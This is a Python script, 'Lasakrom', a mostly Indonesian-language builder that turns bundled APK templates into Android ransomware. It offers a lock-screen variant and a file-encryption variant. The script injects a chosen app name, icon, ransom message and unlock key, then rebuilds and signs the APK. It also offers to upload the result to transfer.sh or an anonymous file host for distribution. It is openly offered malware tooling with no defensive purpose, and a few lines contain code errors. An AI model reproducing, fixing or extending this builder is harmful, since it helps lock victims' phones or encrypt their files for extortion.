#! /usr/bin/env python3
import os, sys, time, base64, json, fileinput
from shutil import which 
from getpass import getpass
try:
    from PIL import Image
except (ImportError,ModuleNotFoundError):
    os.system("python3 -m pip install --upgrade pip && python3 -m pip install Pillow")
# colors
r,g,y,b,d,R,Y,B,w,W,D = "\033[1;31m","\033[1;32m","\033[1;33m","\033[1;34m","\033[2;37m","\033[1;41m","\033[1;43m","\033[1;44m","\033[0m","\033[1;47m","\033[2;00m"
# get default encoding
if not sys.getdefaultencoding() == "utf-8":
    exit(f"{w}{R} ERROR {w} please set terminal encoding to UTF-8")
# check file and directory
if not os.path.isdir("data"): exit(f"{w}{R} ERROR {w} directory data not found !")
if not os.path.isfile("ubersigner.jar"): exit(f"{w}{R} ERROR {w} file ubersigner.jar not found !")
if not os.path.isfile("testkey.jks"): exit(f"{w}{R} ERROR {w} file testkey.jks not found !")
# check module and requirements
def check_requirements():
    if which("aapt"): pass
    else: exit(f"{w}{R} ERROR {w} please install package: aapt")
    if which("mogrify"): pass
    else: exit(f"{w}{R} ERROR {w} please install package: imagemagick")
    if which("java"):
        java_version=os.popen("java --version","r").read().splitlines()[0]
        if not "openjdk 17" in java_version: exit(f"{w}{R} ERROR {w} oops you're java is not openjdk 17 !")
    else: exit(f"{w}{R} ERROR {w} please install package: openjdk 17")
    if which("apktool"):
        apktool_version=os.popen("apktool --version","r").read().splitlines()[0]
        if not "2.6.1" in apktool_version: exit(f"{w}{R} ERROR {w} oops you're apktoil is not apktool 2.6.1 !")
    else: exit(f"{w}{R} ERROR {w} please install package: apktool 2.6.1")
# clear screen
def clear():
    os.system("cls" if os.name == "nt" else "clear")
# variables
imgv1 = ["Lasakrom/res/drawable-hdpi-v4/ic_launcher.png","Lasakrom/res/drawable-mdpi-v4/ic_launcher.png","Lasakrom/res/drawable-xhdpi-v4/ic_launcher.png","Lasakrom/res/drawable-xxhdpi-v4/ic_launcher.png"]
imgv2 = ["Lasakrom/res/mipmap-hdpi/ic_launcher.png","Lasakrom/res/mipmap-mdpi/ic_launcher.png","Lasakrom/res/mipmap-xhdpi/ic_launcher.png","Lasakrom/res/mipmap-xxhdpi/ic_launcher.png","Lasakrom/res/mipmap-xxxhdpi/ic_launcher.png"]
# banner
# Lasakrom - Simpel android ransom atak (version 3.0)
class Lasakrom:
    def __init__(self):
        self.AppIcon=""
        self.AppName=""
        self.AppTitle=""
        self.AppDesc=""
        self.AppKeys=""
    def write(self,file,old,new):
        while True:
            if os.path.isfile(file):
                replaces = {old:new}
                for line in fileinput.input(file, inplace=True):
                    for search in replaces:
                        replaced = replaces[search]
                        line = line.replace(search,replaced)
                    print(line, end="")
                break
            else: os.system("rm -rf Lasakrom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} gagal menulis pada file: {file}")
    def buildapk(self):
        try:
            os.system("apktool b --use-aapt2 Lasakrom -o final.apk")
            if os.path.isfile("final.apk"):
                os.system("rm -rf Lasakrom > /dev/null 2>&1")
                os.system("java -jar ubersigner.jar -a final.apk --ks testkey.jks --ksAlias android --ksPass android --ksKeyPass android > /dev/null 2>&1")
                os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
                if os.path.isfile("final-aligned-signed.apk"):
                    output = self.AppName.replace(' ','')+".apk"
                    os.system("rm -rf final.apk > /dev/null 2>&1")
                    os.system("mv final-aligned-signed.apk "+output)
                    print(w+"-"*43)
                    ask=str(input(f"{b}>{w} Apakah Anda ingin membagikan APK ini (y/n): ").lower())
                    if ask == "y":
                        print(f"""
{w}[{r}SHARE TO{w}]

{w}[{b}1{w}] transfer.sh - transfer file online
{w}[{b}2{w}] anonfiles.com - anonymous file upload
                        """)
                        while True:
                            x=str(input(f"{b}>{w} choose: "))
                            if x in ("1","01"):
                                link=os.popen(f"curl -s --upload-file {output} https://transfer.sh").readline().strip()
                                if len(str(link)) != 0: print(f"{b}>{w} Sukses disimpan sebagai: {g}{link}{w}"); break
                                else: print(f"{b}>{w} Failed shared to: {r}https://transfer sh{w}"); break
                            elif x in ("2","02"):
                                os.system(f"curl --no-progress-meter -F 'file=@{output}' https://api.anonfile.com/upload > response.json")
                                f=open("response.json","r")
                                j=json.load(f)
                                if j["status"] == True:
                                    f.close()
                                    os.system("rm -rf response.json")
                                    link=j["data"]["file"]["url"]["full"]
                                    print(f"{b}>{w} Sukses shared to: {g}{link}{w}")
                                    break
                                else: print(f"{b}>{w} Salah shared to: {r}https://anonfile.com{w}"); break
                            else: continue
                    else: pass
                    getpass(f"{b}>{w} Sukses disimpan sebagai: {B} {output} {w}")
                    exit()
                else: os.system("rm -rf final.apk > /dev/null 2>&1"); exit(f"{w}{R} ERROR {w} gagal membuat APK")
            else: os.system("rm -rf Lasakrom > /dev/null 2>&1"); exit(f"{w}{R} ERROR {w} gagal membuat APK")
        except Exception as ERROR:
            exit(f"{w}{R} ERROR {w} proses terhenti: {ERROR}")
    def builder(self,version):
        print("")
        if version == 1:
            while True:
                x=str(input(f"{b}>{w} ATUR IKON APLIKASI ({r}PNG: icon.png{w}): "+g))
                if os.path.isfile(x):
                    if ".png" in x:
                        self.AppIcon=x
                        break
                    else: print(f"{w}{R} ERROR {w} Format file tidak diterima!"); lanjutkan
                else: print(f"{w}{R} ERROR {w} File tidak ditemukan harap diisi dengan benar !"); lanjutkan
            while True:
                x=str(input(f"{b}>{w} ATUR NAMA APLIKASI  ({r}EX: My Apps{w}): "+g))
                if len(x) !=0: self.AppName=x; break
                else: continue
            while True:
                x=str(input(f"{b}>{w} SETEL APLIKASI_TITLE ({r}EX: Phone Hacked{w}): "+g))
                if len(x) !=0: self.AppTitle=x; break
                else: continue
            while True:
                x=str(input(f"{b}>{w} ATUR APLIKASI_DESKRIPSI ({r}EX: Contact Me{w}): "+g))
                if len(x) !=0: self.AppDesc=x; break
                else: continue
            while True:
                x=str(input(f"{b}>{w} ATUR KUNCI_APLIKASI ({r}EX: SeCr3t{w}): "+g))
                if len(x) !=0: self.AppKeys=x; break
                else: continue
            print(f"{b}>{w} Membangun APK ransomware Anda")
            print(w+"-"*43+d)
            os.system("apktool d data/v1/Lasakrom.apk")
            if os.path.isdir("Lasakrom"):
                strings="Lasakrom/res/values/strings.xml"
                print("I: Using strings: "+strings)
                smali=os.popen(f"find -L Lasakrom/ -name '*0000.smali'","r").readline().strip()
                print("I: Using smali "+os.path.basename(smali))
                self.write(strings,"appname",self.AppName)
                print("I: Adding name with "+self.AppName)
                self.write(strings,"alert_title",self.AppTitle)
                print("I: Adding title with "+self.AppTitle)
                self.write(strings,"alert_desc",self.AppDesc)
                print("I: Adding description with "+str(len(self.AppDesc))+" words")
                self.write(smali,"key_pass",self.AppKeys)
                print("I: Adding unlock key with "+self.AppKeys)
                time.sleep(3)
                print("I: Adding icon with "+self.AppIcon)
                for path in imgv1:
                    if os.path.isfile(path):
                        with Image.open(path) as target:
                            width, height = target.size
                            size = str(width)+"x"+str(height)
                            logo = "Lasakrom"+os.path.basename(self.AppIcon)
                            os.system("cp -R "+self.AppIcon+" "+logo)
                            os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                            os.system("rm -rf "+logo)
                    else: os.system("rm -rf Lasakrom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} direktori tidak ditemukan: {path}")
                self.buildapk()
            else: os.system("rm -rf Lasakrom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} gagal mendekompilasi APK")
        elif version == 2:
            while True:
                x=str(input(f"{b}>{w} ATUR IKON APLIKASI ({r}PNG: icon.png{w}): "+g))
                if os.path.isfile(x):
                    if ".png" in x:
                        self.AppIcon=x
                        break
                    else: print(f"{w}{R} ERROR {w} Format file tidak diterima !"); continue
                else: print(f"{w}{R} ERROR {w} File tidak ditemukan harap diisi dengan benar !"); continue
            while True:
                x=str(input(f"{b}>{w} ATUR APLIKASI _NAMA ({r}EX: My Apps{w}): "+g))
                if len(x) !=0: self.AppName=x; break
                else: continue
            while True:
                x=str(input(f"{b}>{w} ATUR APLIKASI _DESK ({r}EX: Contact Me{w}): "+g))
                if len(x) !=0: self.AppDesc=x; break
                else: continue
            print(f"{b}>{w} Membangun APK ransomware Anda")
            print(w+"-"*43+d)
            os.system("apktool d data/v2/xransom.apk")
            if os.path.isdir("Lasakrom"):
                strings="Lasakrom/res/values/strings.xml"
                print("I: Using strings: "+strings)
                self.write(strings,"AppName",self.AppName)
                self.write("Lasakrom/smali/com/termuxhackersid/services/EncryptionService.smali","AppName",self.AppName)
                self.write("Lasakrom/smali/com/termuxhackersid/services/DecryptionService.smali","AppName",self.AppName)
                print("I: Adding name with "+self.AppName)
                self.write("Lasakrom/smali/com/termuxhackersid/services/EncryptionService.smali","AppDesc",self.AppDesc)
                self.write("Lasakrom/smali/com/termuxhackersid/ui/MainActivity$a.smali","AppDesc",self.AppDesc)
                self.write("Lasakrom/smali/com/termuxhackersid/ui/MainActivity.smali","AppDesc",self.AppDesc)
                print("I: Adding description with "+str(len(self.AppDesc))+" words")
                time.sleep(3)
                print("I: Adding icon with "+self.AppIcon)
                for path in imgv2:
                    if os.path.isfile(path):
                        with Image.open(path) as target:
                            width, height = target.size
                            size = str(width)+"x"+str(height)
                            logo = "Lasakrom-"+os.path.basename(self.AppIcon)
                            os.system("cp -R "+self.AppIcon+" "+logo)
                            os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                            os.system("rm -rf "+logo)
                    else: os.system("rm -rf Lasakrom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} direktori tidak ditemukan: {path}")
                self.buildapk()
            else: os.system("rm -rf Lasakrom > /dev/null 2&>1"); exit(f"{w}{R} ERROR {w} failed to decompile APK's")
        else: exit(f"{w}{R} ERROR {w} ups, belum ada versi lain!")
    def menu(self):
        clear()
        print(f"""
{w}{R} Lasakrom {w} SIMPEL VIRUS RANSOM

BY LASAK STORE

a simple tool for making android ransomware
any loss or damage is the responsibility of the user.

{w}[{r}PILIH RANSOMWARE TIPE{w}]

{w}[{b}1{w}] Lasakrom - JENIS LAYAR KUNCI {w}({y} ANDROID 10 {w})
{w}[{b}2{w}] Lasakrom - JENIS FILE ENCRYPTION {w}({y} ANDROID 7.1 {w})
{w}[{b}3{w}] Exit from console
        """)
        while True:
            x=str(input(f"{w}[{b}?{w}] choose: "))
            if x in ("1","01"): self.builder(1); break
            elif x in ("2","02"): self.builder(2); break
            elif x in ("3","03"): exit(f"{w}{R} EXIT {w} terima kasih telah menggunakan alat ini!")
            else: continue
        
if __name__ == "__main__":
    try:
        Lasakrom=Lasakrom()
        Lasakrom.menu()
    except KeyboardInterrupt:
        exit(f"{w}{R} ABORTED {w} pengguna telah menghentikan proses")
